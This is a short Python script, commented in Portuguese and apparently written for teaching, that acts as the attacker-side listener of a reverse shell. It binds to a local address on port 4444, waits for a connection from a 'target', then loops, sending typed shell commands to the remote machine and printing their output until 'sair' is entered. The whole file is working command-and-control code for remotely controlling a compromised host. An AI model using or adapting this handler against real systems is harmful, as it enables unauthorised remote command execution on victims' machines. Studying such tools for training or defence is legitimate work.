#importando biblioteca
import socket #interface entre aplicacao e elementos de rede
import sys #interacao com o computador

sys. tracebacklimit = 0 #restringe interacao do interpretador

#funcao de conexao
def conexao(): #definocao de funcao
    s = socket.socket() #instancia do socket na variavel s
    s.bind(("192.168.0.29", 4444)) #assiciacao de endereco e porta local ao socket
    s.listen(1) #quantas vezes o sistema vai escutar conexoes naquele socket
    s_remoto, ip_remoto = s.accept() #variaveis (s_remoto e ip_remoto) vao receber as informacoes sobre as conexoes remotas
    print('conexao remota: ', ip_remoto) #imprime na tela o ip remoto

# estruturade comando para o alvo
    while True: #abre a estrutura de repeticao (loop infinito)
        comando = input("Shell> ") #variavel comando recebe o que for digitado
        if 'sair' in comando: #condicional verifica se o usuario digitou o termo sair
            s_remoto.send('sair'.encode())#envia para o socket remoto o comando, codificado
            s_remoto.close()#encerra a conexao
            break #encerra o while
        #enviando comandos ao alvo
        else:
            s_remoto.send(comando.encode())#envia comando para socket remoto
            print (s_remoto.recv(1024).decode("utf8", "ignore"))#imprimir resultado do comando

#chamando a funcao conexao
conexao()
